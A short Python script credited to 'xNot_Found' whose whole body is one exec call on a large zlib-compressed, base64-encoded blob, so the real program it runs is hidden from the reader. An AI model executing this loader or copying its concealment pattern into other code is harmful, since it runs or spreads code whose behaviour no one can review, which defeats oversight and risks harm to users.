#Encrypted By xNot_Found
#Github : https://github.com/hatakecnk/
import zlib, base64
exec(zlib.decompress(base64.b64decode("eJztfWtz27bS8Pf8CjYzseQTW9bVt/OoedJc2jxNk0ydttNxMxpIhCRGvKgkFdk5Pe9vf7EgQYIgwJso2XW1k8gSCS6Wi8VidwEsDGvpuL7meEead0s+fMPCR5qOfBx8c5GtO9aRNkfe3DTG5AK56M9djHTDnh1pnz3HPtJm2F8ijzy+ck1aauI4CwOTr4+mrmNp1sr0jaXrTLDnkcdaS8cxNSOo+iNF9oFceeS7t5ePNALhLQtP5sg2vuJH+GaCl772hl5/5bqOGxR0vBYh28dWs7E0ll3NsD0fmWb8ZOPwETY9HJSO8HN1uPjPFfZ8j15XVZNVFUNAagpell1oBdgMx/ZYZS8c28YTuESRh8xhtLJS37nO2sPuIxebDtKbpNbDR+Sj5WFfx1NEeIntiQP8bzZW/vSc1Dx2tWGMqBViaMINeGxErusmHrnO2PG95mtEWJK6h6cu9ubNGMto7vvL1g8fP374Obj3IWhBhyA+0ix0MwIZGXYoJqTrc9KO2PUIJdfNxi+k/uPnM2z7jSOt8X6JXXRy0Tpva83ntu46hv5vjV7UfjJs46TXbbVb3e6gf3I+aGm//Fsz9EPtA6nTd066rU631e/2tF8JcsK6E/Kzc9o4/PToEWGHtsDmChGKgpZauobta40/bjrj686/LzrW9TeftFc3ht/g5IW0jOET5gQI0AQtmjfh82tCfcOaL8bLyYfgER2uBF+njqsZpOG1m1gsdO0puf9NQ3uqra+D3tKCP4SMZvtIM7HdXB9qx1rn8BMpYjyiD7rYX7m2NsE+qVpnhAQ/1ZRE1a/j6j+TUuuWYev4pmkcRpdvyOWblouXJprgZuObJ15De6IZRyFnnnj/7lhwxfPdZq9DCPt8eBiQdkPfh5ZqW41HMmTtxlFcIqiTiqevOyu/tXYNHzcJGlLGbrB3+4xMZDe/hu8Gb4LhTb6GxeIXSmHCh7J7U3NFZDW+BZLY8kyMl812qwO1ms7MARb+YTNhOLNIwT9ucPePm4vTP27Oz7f+vVDV/ZqqE/BMyHfU1mi9ARGnVljijJSYxqXRZAff23/cjC/I784fN/qYXLuI//L3dkJT8P5ZjcO0B3d5PCn/PcKvapqobbqsbQbkfz/+jk6562fhd3L/fMJ9b8ffL7jvqGyZRPmYJwJJ0eM8SWKZsyR7C4jvJORHfsF8BnYk3+HFFQxBfXkZnjkX5/Iy476csed536Fx+e89TXHjQs3WAlLbLf+9otSqaNZ5ZmlyziW42JdzTng4KZ8o+UshrTojvGdpXzqtggp6S9/lCppeHR9HED5DJA6d8Veh3HgsvIDyDbJejkNRoMPvvz+872cKGejE3eVfnJw9X/lzx+XUjXYZS7D208+a9mv/3emg/1ETQVFLqdqvVkvwkrjq+dpfI+I1caX/4ikjrpOnuPez8XVxe/zmZV1Ufm/489VYyiNQmuRb39LAv/IuT05mtHBr4lgnIedC67ocLeg+yNL++26+643AsfKNBfN9fYP8AO878IoaLfggrlqrxf62tManyAFzwAGjz8TeF3Ofud59HVZKjeZP3ND/1qExIE5EwQl2jkq6a9RZG6MJUN5+FISWaAzh06MxdufIM8zg1wQvlg6QR385i7DQDM1QWMLQfWwhm/2A6ErigoWt4Cu2oq+2E301dHaX/RUwzJfsr3CD0LzwDP77zF2FhRekApv7Gt8xDc+Pf31Zmbbja8z57nWsd+Tnr+Rqg96L73St4Cptfwt5q0gCuBiViz3sh9550KrgEMtiJEnVArYFa/pvudbutDjt9taZGXajOrJuCpm2gsCg5jsLXB1xx2rziOOwTyauoIhF2EhY7KL1yLCXK78pLy1Ylqzel3wvCJhuTEOcED5K97BEgOo31yEvT+ttRCVZYCuITEZBTBF3h0MOYAI7ua6WfFJ8uis8TTsnNMJXDoUcjYiqLUGVeo98lOWYJK0o6BkhIzJ7RiIiDO8NHdBZYrvZoI+3/Bsav3QbMfmkD69YqwTx4uaP+JYGdI+0N+/pl0Np3JivOX7NqF/K3zwUOGKzn58m1O/779+8057/+Ms77fXzF6++e//+x5gtVJVJZJngexoh6Z1ab17GcsuZQ68sZPBWVPw4Z8Vo/JusC1b4AXne2nH1fJR0YIt/8Q0FMHZbQTsxI8pqTdEEjx1nAYYUhyhspDiu/cvPb4XYPs95Oyl17xxtEkXtk3IXyxtH1IhQ4TvubcvwRnPfgpHpo7vCfBEPmwTdiIzBVtN2h+1D/iZcvW5gaIDGJ/KwoafvwlwLvUnYnkC8Gls0sM2urVyon9yZQcDZ5O6Qjtvw0Bd8rOMvxgQ3wBYgJZIsSTEdgIxtMBShpTFa4Nvh+XkXnfcv2r3Tjo4uzs/a3fH04gy1ux1dn3T6+sTFOrZ9A5neyL9d4uEylAD6ikMwGYiwPtUa8GrIH/7f1ft3M2xjF/l4ZKHJ3LDxyNCHneiiB5NIjj0K5pi8Ycd0JsjEQ2yPfrmyMPFN9CEiLkqL9mBWHa0JxJRUFYTfR55njkiXdFbuhKBpfxl2Wu3T7vR8gi+mZ/1xh3ztTzrd3mTS7fV7Z6iPet205tGRjwhD/sM40rjUGnlMAZUiMgaeY8TC/UAELgl3jhhzoAjwB25LeAS3O4l7AquiAgHH4CdlGlwKGAeXYt7B9YikS+DekZx58BidFfhCq2i1G/9N8QlmEcJZxJaN182GpQ8a6UHhprVawvRjk8hZ+i6iUxFzfKMbM+z5kkEFmoOh+E+DICEUof+mywVdI9IepPES+uME5p487H7Bbms5X6abHSbcopk+0r2aBOGRtkQusrwhEJGu8it5BOZLWzCt5zXdlo9vfEkxrOvyUWgt4ReUDmdKvl430AQm6EaBGfVJUXpiOh6WsE6mAVNzBxPyvxcXSDoEYMh5K0rDdGWatxK2MZYtHdJ8EftnLlrOkw1g4ZOpa2Bb956FnRoeOVgZujecrQ1r5aHeAf++tIcX4AE3fjMIhwjJzG1LmLJN68Py4wZAeuwAjTyZ40ng5MgVsqKuOATxfDJxVqTIixhRAgFvjFjasRtaSVTAkixJemhS0iPupew4BZ2BgLwmeg3r9dPFDN/QLw6N2DKOETMA5XbMM17WPwJ6PgaVdgASo6fjr0WFkS38z1KiTamLXxkltQmpQNAnNrKgDLpukG84dPwBiikYTrEINUuVSNoqZkZxEd8nlgZcjP+/IYLJd7SlMVloxIWmbHoWt8H17Yn96ZK3J0n/wqIzphDnqOhtad9K8EECrtTlgrQgNpJkcuhvlHA3BPZTQdYg8jAlmoPrlsW6pLw78nxK8ihlUtbfMQByOweAsoMAUA+K3CJmVXxDKdk5nFdyf7eaOyW+FYc96asUdpRKBqnSkfYiZgnnvL4jjcu7m5wWAemhUvCUDw41aiaAziqoCQg9vKwYFYJy/bb2rwQ97Q0icIlwHqzVIvZG4GRErbd5ZO97osve6CfUkzlhRnQltD0e7Q8QLGZaQUNhx0nCBnX1+bq+c/zNMQ54jO/9OSySq4XUUx7x1dxZB+NgPcjPeOQvsYl9TNQ38eBqwX4uhIDfrxJNWGcMWCMcJ6icGfhmyirEgPDSMI15NJCHvwI9GBpQtcaKA5xVY8WMWPieChVHqMVQcdjlPSMvXBxhkIWL9ZW1LBosjhD1FMFiMJhGc9LBS8WLecx9BeYI+9iRxQ2yKxArGWRUAmCixEBbriKxstOcygByjA8ZSKLPKihuluZXKA8NE43wu7NyA/3F+1VcX45svdya+J7J+6Bcz/sOBhFuvC7AMEngQIT8hgXgG/esQOMCkAZ2seV8wc2GsyrSvMVIEck5L0hOSFJBk7Qglht9dgwiFi2MWK/XrVvyuqsxpta/PUP2yr61nJVXogblBJQMirMNgGedav6rFrLKkwZQbR5NiS0xInKDxy792907sSWcFlRo3o3oule2T0xufvbtJL4JDkt2aClYTS+ZJSReyBgl4yTE/kGaZdgrH3OIWq1WiCsVyC4YlM1ywyfOQh3rjrYxkFLXDQiVNz4l7BXgIrltML9cIw/E18AhT/aCmzJvQD2uAAt4fYWiCULg/kYSSwgEod8NXDSJMdhO9jXp1Jpy8hfDAnm+WXkRCVZ+BnCphUFwSUQjM3ghr/5ZsTrjJ96luyCtWqq5pDwoxwe+B/EYIj4kwjeFOVGAG+qac7mh5kgmV8pxRpzCT3EmnGKWG8JFGFSASWoiCjEpm1G5zCrHsI/Ew13OHVuU8YhhljM2TDyiZRR8K8W7AvxT0yTl3y7Y9NaZ0BiR2KoRm8ywQOOTVAtti1Vquoqzqqau9xKRodaZamPD9eccPRGL6A0d3W6596npKMaSGvTz1WTuOBINcKnJezvYBn/SjYFEQekrJkl1KgBJmf8nrGH987rhUcK3LsOZxGS3TrFBDHle8tHNXWN+pi+hnJViAbHx009BmFlipG9GUkhO4JQEsai9P1LbSl8awn+pBUZ/rfMCDKlGN8FvXEFPUsEVRu5kXtdUACCduc5qSUTOGlP3ra45gRTqwDiraWIghZ2aFJq9gh91TRBAJZTqzZvyPAuvSlwel6vjQqwDMZxegj2Pq1fRaResg3+lx1XZJsx7gMLMmeAAXTlKxnT4S4GKm6yMed1THQHOqlMdCbLTgxCPPzXfoY/opo286Y4IgWy6I9hXkkIkRyYiVE17FAzfp7h0hWfYRTnL4cUbmfMoEalZ8yiEkYEqGcH+laqzKVFVebMp2CpQXX6VYrVF5lVsp2DVxaoXSSga/acasECouFTQP6KiTNCfUqLsAZvTJdJ2UTKqbjuW447meU1VnTiRwE7ZuD9AsIOsFAsZlKcWgKe4CsEABea/ZFCNYIB6py8YSMa9eGB42K4DpSZnPZ7Xsha64YrTjOFLvL+SrQdLeJkylPkL41Lz0NuYl2BQYCV+8SkWatmZkX1q6JzRE0+zJN+2+ETB+GskY6RBTpikqrYEQAAFhQEUcWqFQbhNtoWWBK3eDBc5pjv2+Gu4/hfF8yU0pZNYMLVr+Ixz3oNFbpBoCnJhhXUfHiaX3Gncernht0I4Jqz+KFVvxgZjBom8UO12u3P4SGCvdDuEfB908LXIVogrbhMEZMdLSUWrkVvf0+R6cx+Z4NPGBfh5wSC/F8/gBHodnI2kFa+s6Qp9wdrUMLG2Nvw5LI9MTEZybSZIAl2hAMXlkgrXoDWBlnxmJ0h6DdTAbjVd8fo87pqjXcLqJpUu598joc9pOW1ChgMfNjgDYxs7IRE2pY4d5OpvYK6ZGK/+kfbq/Wtxe6qS8CvfIfpB3w2x8iimmqG7oaqGhdHJCGihNdKhRcIbiHur5L5YJUS9Flvh8QZuc1FOueISl+7LZjM+08UU5RY4ECqLLm6gvFgmDSJSpWJzokzCiw+Lr4lMqwYTyB2yrGvhAhHZ1wHfJTLLoJ5VgqHqqG678g02NbCpe8PQlm2ZBuznHhC75TC91XH3di0Xp9yFjTuKVWARczdkGszZqS3fKHHLHVm/Uf17C3h7FnDM5HtjBUtkeW8Q7w1iJbF7gzhlECcD8Zd723f3tm9J0zeYdOY0lFptSi3fUmYUrezkmaFzOWUKGU0AyFsXS86xuf2bzRUY7L11jWbw97S2O7GCy5maiRUK2w2icopEZVi6uLwJDxIX4vaYJQ/teGToB9SSH14wKCSYniCSWCKTkQHsZVm9hKg7sndJzXtLd3uWLrD3zm1cSXfa27Z721ZJ7N62FWxbcX3L3rbd27Z72zaHtr+tbRusZt2ieZtUJ/8EC7f0DlBUcgcoQIFdoADKHSk06Tgzw+MNePIFVZE1HhdUGuQAJYxySkcpozxJg/ZXcpNpSFfaZKctnG+2U6alTfcU+6rtd8k0+ot3sdqdBLamnR4ASPVCUndu4Dm8SigYlfMQiMGdOw9yZbX3H/b+g5LYvf8g+A/iIvW9/7D3H/b+Qw5tf1v/IbF1bItuRFKr7N2Ie+JG0AOLODcimZYi35tIlq/LqaBUlXUq0qTsfYs6fIv05tK6XYx3Se2j8jECqbhzH0OuyfY+xt7HUBK79zFScxR0B+retXhQG+FQvmVfecHwDuLcpIL89cE01yCq0eormz4QYPPg8b2IHO/DxvcibLzDIPHdW2+Sbr433famm5LYvekmM9322wk5uDe23X474X47YRLq3E54z1yBHW0fxFap7YMPxD1IbWy8Uz+h2jbHvcPwAByGe7T5MkMT7D2IvQehJHbvQaQWmLCkenvX4b64DpWNsXBeMJgkrNMOE45UrxKdzjZ7SQVJCgvku0gtarCwm28U2jkp1EobhfYdGIXz5b1bJjBf7tcIcDy7Q7tQtn5oq2sBSNPfuUEo6f17Q3BvCCqJ3RuCgiGYzFu8NwbvizG4jyPv48hJeJBx5PR5GVteAP2PCyQHCl4MJN8X56FyWHnvRciZ/Tf0Iu5RfDlDQezdir1boSR271YIbgWcLDKaE6Ifuk+R9XKCaV/p6LTE2X0/Gbah/QCi8Do0LZqc1kUuUeBx6cO6Dvf7aWX6hvadu/IxsYomOKq8rsP9rlZLMlBso5rEcX8U9WtAvSWuJU4A/B3NHUd7MceTxQZn8pU/BA46nXAYDn/pMipU9yFwAc6qh8AlyKZdXDwELsIvHgJnkV6RdwBc9LDsALiJSxVV6voceakzupQnwkU1qE6E80DKyx7eFmHNOrxtDIJd9cy2qIa8M9uoSr8Fqd70vLaoyiLnVhU4o6rYeVSbnz0l6VqB7D3sIS7N4oyQliSclVJ71zHxb969fh/f+MTpvY9zrPlUOWvEVSZv5WvWyvO1MQ4DBd4fdlgBtflvnZUblZwarud/0xBIKOZWpTzpopkAgqFESPOodj2Kx0x+QwYcNUpkjfTzzPhIhXhQ4WBEgTCQ0n5MHSP+jvPQooPUkTQql+ZTgut0hM1kCifd3bwmSKB+Tzopdd3Xjpsdl1JXUdqh/9ohfCacoCI8ikMZnW4vWRKiUqToyjVNY9wifwKdwhp8fIyWhjhZ788d/QSt/HmLdu5ku3d7Z2eDi4v2xeCiczoYPOkOuoOzF+1pp99GaIz16fh0gCbdM3TWu8B6B3W7p71x54AYaxbyhyAaB56+GH3Brkfcg2H3gK5U4xNUmM4EmXiI7dEvVweMsbQAvDaUIAiGhuMdzLCNXeTjkUfoI9hGE/ISBvaGnQPPmA1708FgML24ICR1phP9DKH2pN+fDs6ng24XT0+F5rnlRbcJjEveJ2NSg2dFAwJ/knhaWr6Tfr48/LtZKFvoKQBZvUVVobwbwgHutqwrGvoGWD+ELZvCSlp5S8Fxzt8sZq411ut1oncEbX7dwDDcjixvJov4VhcC+ZPfxE/2rOfh4EU12tIhZYui2bI8lWv9MjJVDnMpuQKoR7YAVPIFoDY/l1+7SmXeH8hb94Gp9e4W1TqDPPXOoKiaj5qvck+XP72DbqqquJ6uWg57RnftKtHX12UBsrotQK53XH2YUPOrjBDJMVQaNtTodiSXqsrrk81yNVSST4B6ZRQgT04B8qMcy6+9YLgxUbbrIMIDG3N6OxhzGBQdexiUHYOitt1Yjcix7LDvqwiot/+XqyVDB/Ryq6lfDwAU0QUAxaKetYxhDOoRQjmmjcY0Ndody7eKiPplvFxNG8k5wHZkHaCovAMUk3kAE80NNxgNx4brz3V0W7T5vvbJc/T5louXJuk4zcYJROgLvtADG037OxxNGZQdVRlUHV0Z1Kfg5NjuQBupCNmORipXW4ZW6heubnuaCaCMdgIorqEAah2dGdQrxHKMtYzWavR31E9UxGyvr5SrsZb+ArDdPgNQtt8AlOs7AHSU9ioN8wxm6Csb7r1q4z2D5deBNNpLaiiF54HZD4M7sB8YVLUjGGxqTzCoXyXLsd6h3lQRtF3dWa7WDP05KF3t9nUoQBU9ClBelwJsxR5hsJ1OIMdcq32iruaO+5uKqO33uXI119rvAHbT9wCq9j+Aan0QYPn1FBJvLBzbd8zc8L0KHpghcXqHhgSDTQ0KBnUZFgy2p1vl2O+B4lMRthvlV672DAV4Wrn63SlBgE0UIUB1ZQiwVcOEwXY7kbyGrRgq6uruSb9VEbe7vluOgq30X4Dd9mGATfsxwGZ9GWD59QwMHA/dIntW2cBh8MAMnbN7YOgwqMvgYVC34cNg+7pbXss9UqgqAnerVMtRkaFYzzYmY/fKFaAOBQuwuZIF2InhxGA3nVBe01YNKXW196z/q4jcvQ4oR8nWDCwGd6MLAOrSBwD16AQAec4Mx3Vvj7QpsVWwrvkO3aaq+fFOzGgz3GVzi/3Yd2812PFoO6RqV1uj21Y9td0vISifO+Qjpq2gSDW2+dvxVAb7m8Ot8QFtM9MZI5PmgOF/G7ppeD5/hYoJvbDfEx2Rl9gTHfCs2L5imj7ozUtNkTyIrwj4XgzpB3FbqxJpaj80zbMUNlfwHkFLJQoV3918RXSLn7m7FnKx3YDN4hJnETf77cO0DvyKddim7c9BXAx71vpIvzUDxTX0iCAvjjTywxs2DyVZ1sjjLQ8okWjpAKkXpU8jZYU8fEAhpcCwWWk5ia3PTpw2BqB0QiYqDTvUAJRzggYYkwKJ39iluTL4axMcGF78tRmaoUSh1TKtDmQpOFXpN2leNVogO63neLVAuSK7guSUUDJUOS1vaRqiPKznwH/oAukGXoXmFEEDBSga07AxoPJdYykRLSHD+r2KVESvkxOvoEqnzohFikvy+E4qeTwV4KU3LxCyIG7ROMxCAknoVkuJSqGCQ9pwIXs6HcSAmhVIDC+SPppHzhpPR5D5VJ56kn8szMDIN8VfCaYr0zDSp2UpBhmUzl7JE5HOGAGvf53kiiKvZMGMlvQlQsXCVC+fRIRP1PCjzPmCJJKaSHiSe9rw20TOyJLZeeSedcCJQs41UZIpwZgs8wQjfLK6bDAEWeIRlqE6PJP9PevFB479qCD7q2zIpOMHI4ahVZNPe/jToZbeHM6l/wyYmJ9Bc3wud+pfgIUMODlDimMBS3cKtNAUp1qM/FtJuVAbHYbSGdfz1viCJVWcJhKqsv5ymKwKUqhyzQVBkVxUrO0PJdaSJHtqKYPGTpo0V2BlJ7W+3PreUV5DljXNi89HpxjibwUSuoBJOAZ1wNpEdFfGj6JyEyjHGC6WmzwqVS//rj3ypjfEZAz8+fip4+NvEwJH+1XYzkIixzBrWcL8iw92eajuXdbL1Z7VMdAgNIkVdQqD9FZ1ZW8MsHMJtuvK2sghtjBN9TtzndVyh6kOaSq2EcurF8hr4lpCap1F4CosiUVXd+7DAGfV3IfJ96A9QUx+GFUgJj/c8VFTRnYerFL5x3LPjkriLnA0FOhSL+egJ0NnBoQXZGPnxy5Z6siI9bLUkTnsz2iCgJZtHvIAoEwLv4PDHih/Ch/4ELNqt4c+ABTL4V7t8AeA+uLOkbJLtWfpHk26ctFjF+g77OKoCYAC/RwgOqAho68DxP3dSPV3AGWGsKjfqxK6Fuj7ABn9P6BvVlIH0GFW5W7IaVCqAYBSLUsrP3lm6OFilhmN/JRRCQCIhqkLtHKSiZtohmy2wSSst86chi2kJOS0EkXxPa09R0/Q1qh1jkqpLwDK6YyAf6Gpl2MHRC+Dy2sNKlEnQT3es6mBTd0bQrscGfqBaViGP7xgUErwPEHkcIbMgXZZgnbxsrULQKxhllINA5AZRoo0TVY+5M1SWVVPfpw2TnNWeQSnfySz4PJGCud3GnrodNYxW+QbvgE2zXWjRX6Be9lqsb8tLezU0K4OnaWB0mljfbMoUPItnfjomYzjZpKOaIVgAy1Ic1Ej4rsid8aFsiFGBntS3Zl6bqTykWdqyZMON6hKvJnqgsKmwzjZw5HqbDFCPWTZHRfIskuZ+zdaXsqYljNhs81suwB/FpuDSc+i/CnXYZUmK+Teyp+1z1KkE5yXm5tIBMY7snkJuf258PhYOHu+ljmMPytOYNBxgpvCQIWnMNJMqH36IptL2ZwCgAe7Sr2hSugK8AA1yC4SuwIU0SQMymgUBrvXLAxKaBgGtWqabmFNw0CucbpqmgsdB7KZBmKwiSbicKg0UjdXI/FI8jQTV1aloTK4ClDwzBOCqBdorLI5QQEeoNraZW5QgDLqi0EVNcbg7tQZgwpqjUGt6q1XWr0xkKu5Xp3pCWtTewzqUH8cLpUa7BVWgzyyouqQe0alFgu0AkC5hfIsWeS4UhYpIGvDlJEAD1DZ3kXqSIAqSpfBJsqXwd0rYQYbKGMGtSrlfmWlzECunPvbzDJXu7JmUKfS5nCqlHe/tPLmkZZV4tyzKmVeotUAqu1+gooGG242f4C6+S7T8gFsoqMZ1KGrGdwfnc2gBt3NoFYdPthYhzOQ6/LBLjNtbU23M9iGjudwq3T9oLKu55FX1fkcDpXur9DKAJvtgIWK68isBvAAx4T7kGENoI6xgUGdYwSD+zdWMKhxzGBQ69hxWtvYwUA+hpzeZXKjrY8pDLY5tnB1qMaY043HGL6STccaDpdqzNlAKgDqyb6wg3UQZaHguomyACw/k8+X9rqdzVM6PMAR+D6l/gKocyRmsI0RmcH9HZkZbGGEZlDrSH1W+0jNQD5in23Og/qy4+xsBGewi5Gcq0s1op/VNqLzldU1snM4VSO8IEXBGkbJQe6wfjFYYUnYHqQK+eA4ZrPXDte4tiy0bMKKyiPN0Pl1r+V2YJZfq/7SsXFyfWtLhVay7Pb9jycvPkhX3nYTK29JHwz2CMc1ncQ7hOX7gItQQSqnCUo89AWrtiml5Jsirr7uPbkBcOyuiGT/0zasUmo2yEeUWrFLLZeCG1NeSoSoa70CDNI7Pyy5Rv0YZBYrtJ2lRH6j34hVRXfTxtjIONuES8DYw2Jb6HzaqUJRoLVL8sawQvRvlPTFExReUe2hlqEyWiSbq6R70/bNqTCtX2ISEvvH6ZsLOQfiFFPJ96ozMZSHbN3Iax66lWNN93JA8fRgoNwctQRZW67jKX0yMqrn9GvPKaHeP7FUZM/I2GbAQ+g3ye3ke+U1BVoox22qN/mQnGViWiGP+kIZtnvJFEFBsyxRPO58B+NYkUww9LFQ5CJ+aX9pMW8yDbrg8TwTTZa5o0xu17LaT1Z3SmMo85mW0nvVqpLlzxOqWq6V9URJNmQ3s92YOtIOARC7zksKW2RWFxA6hqG63EUYingHm4pfjKOaCPI0JIy62GYum3J4h1JdrrrNJBtAKd1V8/dkNkH8pEYflbNdss2Oo6ie9Is+sm/ROvJE2M8A63p+q7RcnyUHf0yGL23NDNhn3L3r2xP7U6apTNQDraloLpL4DSLqKV/EBCQM6a2wRZWRyee1lWXRYM//LtniKsEhxyPgshXbZbO2ymbuhWKI393BPly1thDEihJwi+aO84/zcrNerva0TL9tKyGTCRGebSRkihHXkpCpa/V59L94hj2jiU13mOKJyvmI7kGPOkDiWtgDnLozOgHG8jo0SW5aHcSIxTxO9MkwVUqeLg1RyPIRhWgcK41Kji6JUpXqhKINhKqsTg0x9zNUKsUuGQDy8SfryEqfAFAkE3/+HEIVFQ6gFOWoqf5h2jzN7vpyE5QYKULX/jqY3PpsQSivHXwvkx/FB+0Y+EEZGZUIMcjeQpK0hWHRrHZcgIJWxUUoICSfmGP6idD668q0RX+vjghdmSyZNDZHXyCdawWaI5HBFVqLzfuQm7FIGJD+fR0kYIkuErcJBZeF+UvTsKn7WzI3jXymWFiFIczw0qqESFFK0MNo+1fiwMNXYaaVqglKLdBCVAhuNv639S/Bu3Z8iFfSsi0PI3cyhwks87BFzQBB50EYISjK4gfk8bTiG7ut5KKKoJtHT55MHHtqzILLz1qeOxlOlxP/5qBF2t8cGvpBiwjTjHw5fvPyoKUTC2XIUBl6jEcSKCBVj0gT+I572zK80dynPfOju8Kyoh42iRM4gqBi03aHbRm+6wbLGdz4RFBJfeaFSZPIAMbV2IL077zy5IFl0Iub5LFF5ALNsNd69fPP738evXn36/O3b16Ofrl69fO75z+9evxtqs0A1PFnOikMKfPC5gTi5M0JoJrsBCDNRBQUYZ1s8C9AOJUQQo8cO6iWMBLEAkHK2E/mIoVff3n7TrlMITmTGUWc4jLBYgXo89KaxWTitHOIQ4riNJZ4vvhvMAmsnjhI54kuglU+o8u1TWo0iQacRHSv+hQv7/MmTSfO0t2bT/WaTxnMi984MYucNKUAeHMKYHsZT1Mvv+UMp8Uym+46o2n5M6WyM5jWdKJM1HVpw1Q2q7OzlZa2rctmKa1iZAfs3Zvae1N7b2oLsDe196b23tSuYGpLxpRdGdwsBry3tf8OtvZ2EounXn2jBOJa0fzhhXKG31Ge8PJmd2Y+8HtndSd5UoPRrdWU47uKSf69u1ruDfK9Qb43yAXYG+R7g3xvkFcwyFMjyq7M8WDRxN4Yv2tjHFZFecWsbSpQS+TPK4S0E9uRaJ2S/S7hcKrejXQfjxxPmKp1rMhQm2fpEC15PZU9WFTlhUwXGybF/3gzEjwR8z58PnOzUXF7MN9mKmwvFbCV7shOKmgj5dpH+bZRMbuoFptIag+VsIVUdpDcBtrU/ilq+9Rp96RtW6lpszdYMiOIosrbgcFCL42dyF55qOZJ1svVvkj9O/IOP2NEt794Wrjr94Pj+XWtVk9WAIbupuh7IvofHSIaNdHelyOvg+4Bj/onYixqOhlXfLwp3tMUXgiyLGvYdnCmonhDzOWX8ZNuL6x85q5csiIKC7r6Iv4AZ9VjmXmiqYoRl/JH6MXF/FTVudBr8pbyRyhki/lnRGpTaOSoRHSqhfzwTgvoEmWX8UeYsxbyU4JV6LOrEKsZ5KzlDyR56Sg3DeRXJ1Z5mlMlQNA1c3arFstDxFd9VqBqgJUddN0CyXRKnUUREZK3hYIHkPKCWX3KZWaqflilCGm9w3fNvR2ymR3C6dy3xqL6tjAwOXhczpdNcPV4XL85642sCQ7VD2iONjIfOFxXSP/Oud3IaOCwPbdnbnVk5Udz2n2EfpW4lgxIGsvAI0cLz6h7hA9wVh3hky9Cu684xkcViGM8vBZkkn775sdXQkisyMAf4ZUN/BHu97++Siu7UhZBVI/KImB1/fb+N8Xh9ZLq1FWK1WaZC6zqH57/8DzjQGxF/dk0iHTk2ROMlqvnL7OHlyxy8kkSySpiczDSnr/7/uff88e+PAKLESkSWtQwiL38Gi2UegwCpdp66JZAmtnlZjcMHZdcSVQ0qRtd6qHE/Q2P+y0tmosxPRU0L7/UAdO1DuGylCnGeosS2oS7Acnk/mGxVUtC2ihnLlm1VGdOtLJpbmBGAkGEF82vG/CujU/qI+8hhQkS1pkwIKJPlAWLwt6m+3/UCNRry2uFW7pEyGWhp2f+7RIHTAZ1WHTRWMyRRszEa86SgJquLzvtT+LEC2lgqAXOjo+f/KQlH6W2zUbslx08//RTXKMmRJf5wHDA8cPkG9c0IZdU4eXXtxElsN0Zw4DAQIvzgZKHrcr3Tt3eqduiUzeTmUezv6VbN9uOXzfbtmM327FnJ9anrlOstybXTkZANhEiIfX6dip68mkS6dqWc5dFYTEqRUofincn118P3ShIs3vb/t33xXaK7MC922jvSXE/Yr/5pIR9npi3rMsz/9Jrtffu+abuOTTN3kXftYsOXN+76fzig/2AnDUgB5ceq8bKX7yEuP3Pt/ypC6AwbLzW6KrjxxXG+OLR24VVDOULxyKNfifhYEriwoo1B2HWkbBKNTUwLe82YpwckZb3cEDy6ICUPx5Nyat4ivGIKgI2FE03HYqmdCiaBILmPQvXNFMWExGocyhaWCXGosbdjTyUv/tBJ7EmbT/q3ONRJ3BK/rmjzt6TvX+eLK9NlA1XylzYkhv7D7IZeBd2bzdsx264vw6r5IiXLRgN/OrybRgNAET3lUsEnpt8w3TMpB4gVQiaIEwKQkomlO/9MWKymJ09wZ3aCAejEDf+cOLwxGtoT+JkCWnV+DSlD7nRq3ymF+StyuZ8J1oys70JSi/Z2OQK19h0ozFVuaRgWtvSjDFLQc0uDddJZJBauWbFPDHBkYHDoB/l6lBHSOFD6s1LGkPPOYO+tgjPPIMxJVTfwsihNmYCzWfoOZq5oT3lH49lY2C9RoaJuS4QdqSPt0ucr9FSY0Q5SvhY56n1krJasIBoiyb2jFc9gqvC0Vv1m1/V9/M+FTfsbnrocGrIYDuDHraPWUI91+tWlfKOokMz2BPPgpxiCcs6UyuxtGYKPwk2zl9/ohvjwW6ipZmSPcxpn3cOS2IcUsctXNmoxwj21a5TmRnAjQQnYkbMUCLhWK5pHp96EgwqxG0gozmoeBiwCmUiE1wiQoEwpEAbBiMHa0Z0mKnz+LQFnVDzc4L6SRNIFZ3b1IKIzLQIz6k+KYD/3mvGeNPiw9aN6UYuF3+ry0NPidWV7/CRmBcff3779EVDKF/Mu0wHP3CpLPsFjzNiMBEtQ1KdJLYRqZ+JI8mjyCD0fYxUz2RAjWJDOX8evmJg0xZ9y1X5RKfSNryOW18LTT1OAALdQB0a0dJ7Y+v4RpXuSihL/PCxg1z9je0TzbgSE8lIuxQI11K0O7dl+mWcALwV1WUi48FPG1T3uCvkKwkPt60zQ0mI8rfwENm6MpMkznPGbl05Sa4w1qzbMDq+Ib2JjCQfXAcSj2nfr0gH3uG6cbrgchR0lLDX8JfCvuPPsVv3IvEQadVV4gnCaZcU14jHFYiLxD0f+avcczrj52VrwcueehxjUy34noCojtBiVTq7R4w7L72Hh25R1QXbcS15K7ZnIMSbrsOOqyuyvLlANotiS5o3X84s6VJM4PZDETu105sVmwaGUFzIvuwIA5EYilSmT4RJcWJrNHxtjDVsLf3beLp7M7NHqYpcXCpdNwsfhzHYD++vPh7wE1vwlkVsUfGEK0KGYHsX91jCQTrbZSnmguS4sFdBU795GRfQxMx6jhj5rqXhgp4aq/WH3VfTYirLwqtyf2OaEy6w/FWeCfkNTRppmmMNMm3ShGbg8mnOlF70g9WLY2yybYJVpAwAFdMw78CvfImXyObE5VIT3pYaZ2ETIxrOF1LNMhiXqPUjtmdonlXtpAS277CJFoiMUxn4Cp4pQvF9ILhmhpnNl4ILhD4CLmRqb9HccLVv43kPfHOp/fXy5U8//f77X5n8J/Xg6/ZlN+naz+jl7mU/eXlOL/cvZTNJ5efhpaLcs35EpqP9n2ONyZ+rH9980NBnpF1+SeJQ7K1UMHyC3CwmfK7UerloF1XaMMBaoSVrG3UAYIJzkRYLuoArLRY2vSyKBXTtMA1u44n3xPvDhs/42/4z/Sn+rQdL2b9/r09YtNBER9rkSCOfY/ov+DJhFyfsYlQguqXTnzr9qXP/hFvkJ6afU/o5o59zWgDTzyn9nNHPOX0E088p/ZzRzznFhunnlH7O6OdcgRwpkI8VyCcK5PxLTRn+Gb0V/Jyy79HP4O6MKzZn3+fs+5TDM2ZPjdmVCbsyYVd0dkVnV8jjBv38TD8X9Cemn5/p54IiNOjnZ/q5oAgN+vmZfi7oIwuG5DMrHBTQ6ednWgAxhAv2oE4/g3pN+mnRT5s+YtJPi34GVxbC8q/1LLEyhF6ag0lDbvyP1mm3JQEOeGQNvkYndY9TmShcfLaeHUYJxJMWgq2omtxQVE0fIR85VRth1dhWVA3GvOq94ZbqzYPH6J8cEnT29qSsgoiZkgEz